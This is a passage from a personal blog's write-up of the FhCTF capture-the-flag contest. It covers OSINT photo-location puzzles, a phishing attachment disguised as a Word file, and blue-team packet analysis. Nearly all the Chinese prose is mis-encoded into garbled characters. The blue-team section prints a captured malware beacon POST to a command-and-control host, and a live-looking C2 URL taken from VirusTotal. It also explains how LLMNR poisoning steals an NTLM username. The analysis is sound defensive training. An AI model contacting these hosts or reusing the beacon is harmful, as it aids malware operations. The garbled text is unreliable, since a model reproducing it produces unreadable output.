<li>level 3 æŠŠ <code>base64</code> è½‰æˆæ–‡å­—å°±è¡Œï¼Œå¾—åˆ° <code>FsCTF{Happy Day}</code></li>
</ol>
<p>æœ€å¾Œå°±å¯ä»¥æ‹¿åˆ°flag</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;CrYpt0_W3b_M4st3r_2025&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="osint"><a class="markdownIt-Anchor" href="#osint"></a> OSINT</h2>
<h3 id="art-work"><a class="markdownIt-Anchor" href="#art-work"></a> Art Work</h3>
<p>çµ¦äº†ä¸€å¼µåœ–ç‰‡:<br />
<img src="/images/FhCTF/35.webp" alt="image" /><br />
ä»¥åœ–æœåœ–æˆ‘å€‘æœƒç™¼ç¾ä¸€å€‹å«åšã€Œé¢¨ä¹‹ç±½ã€çš„ä½œå“è¢«å±•å‡ºæ–¼111.11.04-112.02.05çš„ã€Œ2022å±æ±è½å±±é¢¨è—è¡“å­£ã€</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;å±æ±ç¸£_è½å±±é¢¨è—è¡“å­£_1111104-<span class="number">1120205</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="trace-the-landmark"><a class="markdownIt-Anchor" href="#trace-the-landmark"></a> Trace the Landmark</h3>
<p>çµ¦äº†ä¸‰å¼µåœ–ç‰‡<br />
<img src="/images/FhCTF/36.webp" alt="photo-1" /><br />
<img src="/images/FhCTF/37.webp" alt="photo-2" /><br />
<img src="/images/FhCTF/38.webp" alt="photo-3" /><br />
ç”¨ç¬¬ä¸‰å¼µä¾†åœ–ç‰‡æœå°‹æ‰¾åˆ°äº†<strong>Piazza della Rotonda</strong>é€™å€‹å»ºç¯‰<br />
<img src="/images/FhCTF/39.webp" alt="image" /><br />
æŒ‰ç…§é¡Œç›®Hintæ’å¥½å¾Œå¾—åˆ°:</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Piazz<span class="built_in">a_della</span>_Rotond<span class="built_in">a_00186</span>_Rom<span class="built_in">a_RM</span>_Italy&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å³¶1"><a class="markdownIt-Anchor" href="#å³¶1"></a> å³¶1</h3>
<p>çµ¦äº†é€™å¼µåœ–<br />
<img src="/images/FhCTF/40.webp" alt="land-1" /><br />
å³ä½¿è¢«æ‰“ç¢¼ï¼Œé‚„æ˜¯å¯ä»¥å¤§è‡´çœ‹å‡ºæ˜¯ã€Œæ–°_å»Ÿå£é¤å»³ã€<br />
googleæœå°‹å¾Œ:<br />
<img src="/images/FhCTF/41.webp" alt="image" /><br />
æ‰¾åˆ°é¤å»³å¾Œæˆ‘å°±å°è‘—èœå–®å’Œåœ–ä¸­çš„èœä¸€ä¸€çª®èˆ‰<br />
<img src="/images/FhCTF/42.webp" alt="37077136260_d855810352_c" /><br />
æœ€å¾Œç­”æ¡ˆæ˜¯åŸåœ–æ­£ä¸­é–“çš„é‚£é“<strong>ç‚’åƒä½›æ‰‹</strong></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;æ–°å¤§å»Ÿå£æ´»æµ·é®®_ç‚’åƒä½›æ‰‹&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="the-fh-gift"><a class="markdownIt-Anchor" href="#the-fh-gift"></a> The FH Gift</h3>
<p>ä¸€é–‹å§‹æœƒå‡ºç¾ <code>malware_sample.eml</code> é»é–‹ä¾†æœƒç™¼ç¾:</p>
<p><img src="/images/FhCTF/43.webp" alt="image" /></p>
<p>é€™å€‹ salary_adjustment.docx æ–‡ä»¶å¯¦éš›ä¸Šä¸æ˜¯ Word æ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€å€‹å½è£çš„ ZIP å£“ç¸®æª” ã€‚é€šéæª¢æŸ¥æ–‡ä»¶çš„é­”è¡“æ•¸å­—ï¼ˆå‰å¹¾å€‹ bytesï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å®ƒä»¥ PK\x03\x04 é–‹é ­ï¼Œé€™æ˜¯ ZIP æª”æ¡ˆçš„ç‰¹å¾µæ¨™è¨˜ã€‚</p>
<p><img src="/images/FhCTF/44.webp" alt="image" /></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;M1M3_Typ3s_C4n_B3_D3c3pt1v3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å·¥å•†æ™‚é–“-1"><a class="markdownIt-Anchor" href="#å·¥å•†æ™‚é–“-1"></a> å·¥å•†æ™‚é–“ 1</h3>
<p>ä»–çµ¦äº†ä»¥ä¸‹åœ–ç‰‡:<br />
<img src="/images/FhCTF/45.webp" alt="exhibition" /></p>
<p>æŠŠä»–ä¸Ÿåˆ° <a target="_blank" rel="noopener" href="https://www.metadata2go.com/">https://www.metadata2go.com/</a> ï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹è³‡æ–™:<br />
<img src="/images/FhCTF/46.webp" alt="image" /></p>
<p>ç„¶å¾Œä»–çš„descriptionæ˜¯ä¸€å€‹ç¶²ç«™<br />
é»é€²å»ä»–æœƒè·³å‡ºä¾†ä¸€å€‹å¸¶ä½ åˆ°å±•è¦½ç¶²ç«™çš„ æŒ‰okå°±æœƒè·³éå»</p>
<p><img src="/images/FhCTF/47.webp" alt="2026-01-03_14.35.58" /></p>
<p>å¯ä»¥çœ‹åˆ°<a target="_blank" rel="noopener" href="https://github.com/tschool-students/tschool-students.github.io">https://github.com/tschool-students/tschool-students.github.io</a></p>
<p>æˆ‘å€‘å¯ä»¥çŸ¥é“æ˜¯ã€Œè‡ºåŒ—å¸‚æ•¸ä½å¯¦é©—é«˜ç´šä¸­ç­‰å­¸æ ¡å­¸ç¿’åˆ†äº«æœƒã€</p>
<p><img src="/images/FhCTF/48.webp" alt="image" /></p>
<p>2026.1.18 9:00 - 16:00~1.19 9:00 - 16:00 è½‰æˆ ISO 8601 æ ¼å¼æ˜¯<br />
<code>2026-01-18T09:00_2026-01-19T16:00</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;T-SCHOOL_STUDENTS_EXPO&#x27;<span class="number">26</span>_2026-<span class="number">01</span>-<span class="number">18</span>T09:<span class="number">00</span>_2026-<span class="number">01</span>-<span class="number">19</span>T16:<span class="number">00</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å·¥å•†æ™‚é–“-2"><a class="markdownIt-Anchor" href="#å·¥å•†æ™‚é–“-2"></a> å·¥å•†æ™‚é–“ 2</h3>
<p>ç”± <code>å·¥å•†æ™‚é–“ 1</code>ï¼Œæˆ‘å€‘å¯ä»¥å¾æ´»å‹•å®˜ç¶²å¾—çŸ¥æ´»å‹•åœ°é»åœ¨ <code>è‡ºåŒ—å¸‚ä¸­å±±å€å‰æ—è·¯110è™Ÿ</code></p>
<p>æˆ‘å€‘æŠŠåœ°å€ä¸Ÿåˆ°Google Mapsæ”¶å°‹ï¼Œä¸¦è¤‡è£½åº§æ¨™è²¼ä¸Šä¾†:</p>
<p><img src="/images/FhCTF/49.webp" alt="æˆªåœ– 2026-01-05 00.25.06" /></p>
<h3 id="lithium-exploration"><a class="markdownIt-Anchor" href="#lithium-exploration"></a> Lithium exploration</h3>
<p><img src="/images/FhCTF/50.webp" alt="SalardeUyuni" /></p>
<p>ä¸Ÿçµ¦AI</p>
<p>åœ‹å®¶ï¼š ç»åˆ©ç¶­äº (Bolivia)<br />
æ¹–æ³Šåç¨±ï¼ˆé¹½æ²¼ï¼‰ï¼š çƒå°¤å°¼é¹½æ²¼ (Salar de Uyuni)<br />
ç”Ÿç”¢ç¤¦ç‰©ï¼š é‹° (Lithium)</p>
<p>åŸæœ¬æ˜¯éŒ¯çš„<br />
ä½†å¾Œä¾†æ”¹é¡Œç›®å¾Œå°±å°äº†ï¼Œå¾ˆå¥‡å¦™</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Bolivi<span class="built_in">a_SalardeUyuni</span>_Lithium&#125;</span><br></pre></td></tr></table></figure>
<h3 id="srl"><a class="markdownIt-Anchor" href="#srl"></a> SRL</h3>
<p>çµ¦äº†ä»¥ä¸‹åœ–ç‰‡<br />
<img src="/images/FhCTF/51.webp" alt="SRL" /><br />
æˆ‘å€‘å¯ä»¥çœ‹åˆ°å³æ–¹æ˜¯å¤§å·¨è›‹å¾Œæ™¯æœ‰åœ‹çˆ¶ç´€å¿µé¤¨å’Œå°åŒ—101<br />
æ‰€ä»¥æˆ‘å€‘å¯ä»¥æ¨æ–·æˆ‘å€‘åœ¨:<br />
<img src="/images/FhCTF/52.webp" alt="image" /></p>
<h3 id="å³¶2"><a class="markdownIt-Anchor" href="#å³¶2"></a> å³¶2</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æ¸…æœ«æ°‘åˆå¹´ä»£ï¼Œäººå€‘å°éº»ç˜‹ç—…ï¼ˆç—²ç˜‹ç—…ï¼‰æ‰€çŸ¥æœ‰é™ï¼Œç‚ºäº†é˜»çµ•å¾—ç—…çš„æ‚£è€…ï¼Œå°±æŠŠä»–å€‘é€åˆ°å»ºåŠŸå¶¼ä¸Šè‡ªç”Ÿè‡ªæ»…ï¼Œå› æ­¤é€™åº§å³¶è¢«ç¨±ç‚ºã€Œç—²ç˜‹ç¤ã€ã€‚æ‚£è€…è¢«éš”é›¢åœ¨å³¶ä¸Šå¾Œï¼Œåªèƒ½é™æœ›é‡‘é–€æœ¬å³¶ï¼Œç„¡æ³•å›å®¶ã€‚</span><br></pre></td></tr></table></figure>
<p>by google AI æœå°‹<br />
<img src="/images/FhCTF/53.webp" alt="image" /><br />
<img src="/images/FhCTF/54.webp" alt="image" /></p>
<h3 id="æ¼‚äº®çš„åœ“é ‚-1"><a class="markdownIt-Anchor" href="#æ¼‚äº®çš„åœ“é ‚-1"></a> æ¼‚äº®çš„åœ“é ‚ 1</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è«‹é€šéˆ</span><br></pre></td></tr></table></figure>
<p><img src="/images/FhCTF/55.webp" alt="image" /></p>
<h3 id="æ¼‚äº®çš„åœ“é ‚-2"><a class="markdownIt-Anchor" href="#æ¼‚äº®çš„åœ“é ‚-2"></a> æ¼‚äº®çš„åœ“é ‚ 2</h3>
<p>ç°¡å–®æœå°‹ <code>å…è²»èˆ¹ç­ åœŸè€³å…¶</code>ï¼Œå¯ä»¥è®“æˆ‘å€‘æ‰¾åˆ°åœŸè€³å…¶èˆªç©ºçš„é€™å€‹é é¢:</p>
<p><a target="_blank" rel="noopener" href="https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/">https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/</a></p>
<p><img src="/images/FhCTF/56.webp" alt="æˆªåœ– 2026-01-05 00.40.35" /></p>
<p>çœ‹Google Mapsï¼Œå¯ä»¥ç™¼ç¾æˆ‘å€‘çš„ç›®çš„åœ°ï¼Œå°±æ­£è™•æ–¼åšæ–¯æ™®é²æ–¯æµ·å³½é™„è¿‘ï¼Œæˆ‘å€‘å¯ä»¥é©—è­‰é€™æ˜¯å°çš„æ–¹å‘ã€‚</p>
<p>æˆ‘å€‘æœ‰äº†é€™äº›è³‡è¨Š <code>T06 18:30-23:00 åšæ–¯æ™®é­¯æ–¯æµ·å³½ä¹‹æ—…ï¼ˆ4 æœˆ 1 æ—¥è‡³ 10 æœˆ 31 æ—¥æœŸé–“ç‡Ÿé‹ï¼‰</code></p>
<p>é€šéˆä¸€ä¸‹æ ¼å¼è®Šæˆ flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;<span class="number">1830</span>-<span class="number">2300</span>_0401-<span class="number">1031</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«"><a class="markdownIt-Anchor" href="#æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«"></a> æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«</h3>
<p><img src="/images/FhCTF/57.webp" alt="rider_without_helmet" /></p>
<p>ä¸Šç¶²ç°¡å–®åœ–ç‰‡æŸ¥è³‡æ–™ï¼Œå¯çŸ¥å» ç‰Œã€è»Šå‹ï¼Œæ¯å€‹è©¦ä¸€ä¸‹ï¼Œå°±èƒ½é–å®šä¸‹ç­”æ¡ˆã€‚<br />
<img src="/images/FhCTF/58.webp" alt="image" /></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;<span class="number">2014</span>_Kymco_Many50&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exifçš„æ‹æ”åº§æ¨™"><a class="markdownIt-Anchor" href="#exifçš„æ‹æ”åº§æ¨™"></a> EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€</h3>
<p>é€™é¡Œçµ¦çš„æª”æ¡ˆå‡ºäº†é»å°å•é¡Œï¼Œä½†å°±æ˜¯ exif å®Œçµ„åˆä¸€ä¸‹ç…§ç‰‡çš„ç¶“ç·¯åº¦é€šéˆä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<h2 id="blue-team"><a class="markdownIt-Anchor" href="#blue-team"></a> Blue team</h2>
<h3 id="å¤§è¨‚å–®"><a class="markdownIt-Anchor" href="#å¤§è¨‚å–®"></a> å¤§è¨‚å–®</h3>
<ol>
<li>ä¸€çµ„åŠ å¯†çš„åå…­é€²åˆ¶å­—ä¸²: <code>775a20657e725a206725250925317172587b3774750d2132747f5a2631752251</code></li>
<li>ç¶²è·¯å°åŒ…çš„ hex dump,é¡¯ç¤º HTTP POST è«‹æ±‚</li>
</ol>
<p>æª¢æŸ¥æä¾›çš„å°åŒ…å…§å®¹,å¯ä»¥è§€å¯Ÿåˆ°ä»¥ä¸‹é—œéµè³‡è¨Š:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/config</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>45.33.22.11</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>C2-Client/1.0</span><br><span class="line"><span class="attribute">X-Auth-Token</span><span class="punctuation">: </span>FhCTF</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-binary</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">Target_ID</span>: <span class="number">775</span>a20657e725a206725250925317172587b3774750d2132747f5a2631752251</span></span><br></pre></td></tr></table></figure>
<p>å¾å°åŒ…ä¸­çš„ <code>X-Auth-Token: FhCTF</code> æ¬„ä½,å¯ä»¥æ¨æ¸¬ <code>FhCTF</code> å¾ˆå¯èƒ½å°±æ˜¯ç”¨æ–¼åŠ å¯† Target_ID çš„é‡‘é‘°ã€‚</p>
<ul>
<li>ä½¿ç”¨ Python å°åå…­é€²åˆ¶å­—ä¸²é€²è¡Œ XOR è§£å¯†:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_string = <span class="string">&quot;775a20657e725a206725250925317172587b3774750d2132747f5a2631752251&quot;</span></span><br><span class="line">key = <span class="string">&quot;FhCTF&quot;</span></span><br><span class="line"></span><br><span class="line">hex_bytes = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line">result = <span class="built_in">bytearray</span>()</span><br><span class="line">key_bytes = key.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_bytes):</span><br><span class="line">    result.append(byte ^ key_bytes[i % <span class="built_in">len</span>(key_bytes)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å°‡è§£å¯†å¾—åˆ°çš„ MD5 hash <code>12c1842c3ccafe7408c23ebf292ee3d9</code> æäº¤åˆ° VirusTotal é€²è¡ŒæŸ¥è©¢ã€‚<br />
<img src="/images/FhCTF/59.webp" alt="image" /><br />
åœ¨ VirusTotal çš„åˆ†æå ±å‘Šä¸­,å¯ä»¥æ‰¾åˆ°è©²æƒ¡æ„è»Ÿé«”çš„ C2 é€šè¨Šç›®æ¨™:</p>
<ul>
<li><strong>C2 ä¼ºæœå™¨</strong>: <code>http://171.22.28.221/5c06c05b7b34e8e6.php</code></li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;http://<span class="number">171.22.28.221</span>/<span class="number">5</span>c06c05b7b34e8e6.php&#125;</span><br></pre></td></tr></table></figure>
<h3 id="users-bad-day"><a class="markdownIt-Anchor" href="#users-bad-day"></a> ğŸ§© Userâ€™s Bad Day</h3>
<p>çµ¦å‡ºçš„ç·šç´¢æ˜¯ä¸€æ®µå°åŒ…ç´€éŒ„ï¼Œè¦æ±‚å¾ä¸­æ‰¾å‡ºä¸‰å€‹é—œéµè³‡è¨Šï¼šä¸»æ©Ÿåç¨±ã€å¸³è™Ÿåç¨±èˆ‡æª”æ¡ˆåç¨±ï¼Œæœ€å¾Œä¾æŒ‡å®šæ ¼å¼çµ„æˆ Flagã€‚</p>
<ul>
<li>
<p>DNS æŸ¥è©¢ä¸­çš„ä¸»æ©Ÿåç¨±</p>
<p>åœ¨å°åŒ…æœ€å‰é¢å¯ä»¥çœ‹åˆ°ä¸€å€‹ DNS å°åŒ…ï¼Œå…§å®¹é¡ä¼¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS Standard query A fulesrv.local</span><br></pre></td></tr></table></figure>
<p>é€™ä»£è¡¨ä½¿ç”¨è€…åŸæœ¬æƒ³é€£ç·šçš„ä¸»æ©Ÿæ˜¯ <code>fulesrv.local</code>ã€‚<br />
é¡Œç›®æç¤ºã€Œä¸»æ©Ÿåç¨±ä¸å« domainã€ï¼Œå› æ­¤åªå–å‰åŠæ®µï¼š</p>
<ul>
<li>ä¸»æ©Ÿåç¨±ï¼ˆä¸å« domainï¼‰ï¼š<code>fulesrv</code></li>
</ul>
<p>âœ… ä¸»æ©Ÿåç¨± = <code>fulesrv</code></p>
</li>
<li>
<p>DNS å¤±æ•—èˆ‡ LLMNR å•Ÿç”¨</p>
<p>ç•¶ DNS æŸ¥è©¢å¤±æ•—æ™‚ï¼ŒWindows æœƒå˜—è©¦ä½¿ç”¨ LLMNRï¼ˆLink-Local Multicast Name Resolutionï¼‰ä¾†è§£æåŒä¸€å€‹åç¨±ã€‚<br />
å°åŒ…ä¸­å¯çœ‹åˆ°é¡ä¼¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LLMNR query A fulesrv</span><br></pre></td></tr></table></figure>
<p>é€™è¡¨ç¤ºç³»çµ±æ”¹ç”¨ LLMNR ç™¼é€åç¨±æŸ¥è©¢ï¼Œè©¢å•ã€Œèª°æ˜¯ fulesrvï¼Ÿã€</p>
</li>
<li>
<p>LLMNR Poisoningã€Œæ€ªäº‹ã€çš„ä¾†æº</p>
<p>åœ¨é€™å€‹éšæ®µï¼Œæ”»æ“Šè€…ä¸»æ©Ÿï¼ˆä¾‹å¦‚ IPï¼š<code>192.168.50.200</code>ï¼‰å½è£æˆ fulesrv å›æ‡‰é€™å€‹ LLMNR æŸ¥è©¢ï¼Œè²ç¨±è‡ªå·±å°±æ˜¯ç›®æ¨™ä¼ºæœå™¨ã€‚<br />
çµæœï¼š</p>
<ul>
<li>ä½¿ç”¨è€…èª¤ä»¥ç‚ºè§£ææˆåŠŸï¼Œå¯¦éš›ä¸Šé€£åˆ°çš„æ˜¯æ”»æ“Šè€…ä¸»æ©Ÿã€‚</li>
<li>ä¹‹å¾Œä¾¿æœƒå°æ”»æ“Šè€…çš„ IP å»ºç«‹ SMB é€£ç·šï¼ˆTCP 445ï¼‰ï¼Œä¸¦é€å‡ºé©—è­‰è³‡è¨Šã€‚</li>
</ul>
<p>é€™å°±æ˜¯å…¸å‹çš„ <strong>LLMNR Poisoning</strong> æ”»æ“Šæµç¨‹ï¼Œä¹Ÿæ˜¯é¡Œç›®ã€ŒUserâ€™s Bad Dayã€åç¨±çš„ç”±ä¾†ã€‚</p>
</li>
<li>
<p>å¸³è™Ÿåç¨±ï¼šå¾ NTLM é©—è­‰ä¸­å–å¾—ä½¿ç”¨è€…å¸³è™Ÿ</p>
<p>ç•¶ä½¿ç”¨è€…é€é SMB é€£å‘å‡å†’çš„ä¼ºæœå™¨æ™‚ï¼Œæœƒé€²è¡Œ NTLM é©—è­‰æµç¨‹ï¼Œå…¶ä¸­æœƒåŒ…å« <code>NTLMSSP AUTHENTICATE_MESSAGE</code> å°åŒ…ã€‚<br />
åœ¨é€™é¡å°åŒ…ä¸­ï¼Œé€šå¸¸å¯è§£æå‡ºï¼š</p>
<ul>
<li>Domain Name</li>
<li>User Name</li>
<li>Workstation Name</li>
</ul>
<p>å°‡å°åŒ…ä¸­çš„ Unicodeï¼ˆUTF-16LEï¼‰å­—ä¸²è§£ç¢¼å¾Œï¼Œå¯ä»¥å¾—åˆ°ï¼š</p>
<ul>
<li>Domain Nameï¼š<code>DOMAIN</code></li>
<li>User Nameï¼š<code>Bob</code></li>
<li>Workstationï¼š<code>WORKST</code></li>
</ul>
<p>é¡Œç›®å•çš„æ˜¯ã€Œæ”»æ“Šè€…æ””æˆªåˆ°çš„å¸³è™Ÿåç¨±ã€ï¼Œä¹Ÿå°±æ˜¯ NTLM é©—è­‰è£¡çš„ä½¿ç”¨è€…åç¨±ï¼š</p>
<p>âœ… å¸³è™Ÿåç¨± = <code>Bob</code></p>
</li>
<li>
<p>æª”æ¡ˆåç¨±ï¼šå¾ SMB å°åŒ…ä¸­çš„å­—ä¸²é‚„åŸ</p>
<p>åœ¨å¾ŒçºŒ SMB å°åŒ…ä¸­ï¼Œæœƒå‡ºç¾ä½¿ç”¨è€…å˜—è©¦å­˜å–çš„æª”æ¡ˆè·¯å¾‘æˆ–æª”æ¡ˆåç¨±ã€‚é¡Œç›®æç¤ºè¦æ³¨æ„ UTF-16LE ç·¨ç¢¼ï¼Œå› æ­¤ç”¨åå…­é€²åˆ¶è§€çœ‹å°åŒ…å…§å®¹æ™‚å¯ä»¥çœ‹åˆ°é¡ä¼¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">74 00 65 00 73 00 74 00</span><br></pre></td></tr></table></figure>
<p>å°‡é€™ä¸² bytes ä»¥ UTF-16LE è§£ç¢¼ï¼š</p>
<ul>
<li><code>74 00</code> â†’ <code>'t'</code></li>
<li><code>65 00</code> â†’ <code>'e'</code></li>
<li><code>73 00</code> â†’ <code>'s'</code></li>
<li><code>74 00</code> â†’ <code>'t'</code></li>
</ul>
<p>åˆèµ·ä¾†å°±æ˜¯ï¼š</p>
<ul>
<li><code>test</code></li>
</ul>
<p>é¡Œç›®åŒæ™‚å¼·èª¿ã€Œæª”æ¡ˆåç¨±ä¸å«å‰¯æª”åã€ï¼Œæ‰€ä»¥å³ä¾¿å¯¦éš›æª”æ¡ˆå¯èƒ½æ˜¯ <code>test.txt</code>ã€<code>test.docx</code> ç­‰ï¼Œåœ¨ Flag ä¸­åªéœ€è¦æª”åæœ¬é«”ï¼š</p>
<p>âœ… æª”æ¡ˆåç¨± = <code>test</code></p>
<p>ä¾é¡Œç›®æŒ‡å®šæ ¼å¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;ä¸»æ©Ÿåç¨±_å¸³è™Ÿä»£è™Ÿ_æª”æ¡ˆåç¨±&#125;</span><br></pre></td></tr></table></figure>
<p>å°‡å‰é¢ä¸‰å€‹å·²ç¢ºèªçš„ç­”æ¡ˆä¾åºä»£å…¥ï¼š</p>
<ul>
<li>ä¸»æ©Ÿåç¨±ï¼š<code>fulesrv</code></li>
<li>å¸³è™Ÿä»£è™Ÿï¼ˆå¸³è™Ÿåç¨±ï¼‰ï¼š<code>Bob</code></li>
<li>æª”æ¡ˆåç¨±ï¼š<code>test</code></li>
</ul>
<p>å¾—åˆ°æœ€çµ‚ Flagï¼š</p>
  <figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;fulesrv_Bob_test&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>

    </div>
    <footer class="article-footer">
        <a data-aos="zoom-in" href="/2026/01/01/undefined/#comments" class="article-comment-link">
          <span class="post-comments-count waline-comment-count" data-path="/2026/01/01/undefined/" itemprop="commentCount"></span>
          ç•™è¨€
        </a>
        <span data-aos="zoom-in" class="article-visitor-link">
          <span class="waline-pageview-count" data-path="/2026/01/01/undefined/">0</span>
          <em class="post-meta-item-text">é–²è®€é‡</em>
        </span>
        <a class="article-category-link" href="/categories/%E6%8A%80%E8%A1%93%E5%88%86%E4%BA%AB/" title="æŠ€è¡“åˆ†äº«" data-aos="zoom-in">æŠ€è¡“åˆ†äº«</a>

        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E8%B3%87%E5%AE%89/" rel="tag" title="è³‡å®‰">è³‡å®‰</a></li></ul>

    </footer>
  </div>
    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
    <div class="article-nav-link-wrap right">
        <img data-src="/images/Hexo/hexo_github.webp" data-sizes="auto" alt="ä½¿ç”¨ GitHub Pages + Hexo æ¶è¨­å€‹äººBLOG" class="lazyload">
      <a href="/2025/08/27/Hexo/" aria-label="å¾Œä¸€ç¯‡: ä½¿ç”¨ GitHub Pages + Hexo æ¶è¨­å€‹äººBLOG"  title="å¾Œä¸€ç¯‡: ä½¿ç”¨ GitHub Pages + Hexo æ¶è¨­å€‹äººBLOG"></a>
      <div class="article-nav-caption">å¾Œä¸€ç¯‡</div>
      <h3 class="article-nav-title">
          ä½¿ç”¨ GitHub Pages + Hexo æ¶è¨­å€‹äººBLOG
      </h3>
    </div>
  </nav>

</article>

  <section id="comments" data-aos="fade-up">
    <div class="comment-header">
        
      <h2 class="comment-title">èªªäº›ä»€éº¼å§ï¼</h2>
      <div class="comment-selector">
        <div class="comment-selector-wrap">
            <div class="selector-item" data-selector="waline">
              <span>waline</span>
            </div>
        </div>
      </div>
    </div>
    <div class="comment-content">
          <div class="comment waline-comment" data-aos="fade-up"
            id="waline-comment">
          </div>
    </div>
  </section>

</section>
        </div>
        <footer id="footer" aria-label="Site footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    <div>
      <span class="icon-copyright"></span>
        2026
        <span class="footer-info-sep rotate"></span>
      ä¼Šè—¤è’¼å¤ª
    </div>
      <div>
        åŸºæ–¼&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
      </div>
      <div>
        <span class="icon-brush"></span>
        29k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        02:28
      </div>
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">ç¸½è¨ªå•é‡&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">ç¸½è¨ªå®¢é‡&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
  </div>
</footer>

          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav" aria-label="Mobile navigation">
  <div class="sidebar-wrap">
        <div class="sidebar-toc-sidebar"><h3 class="toc-title">æ–‡ç« ç›®éŒ„</h3>
<div class="sidebar-toc-wrapper toc-div-class" >
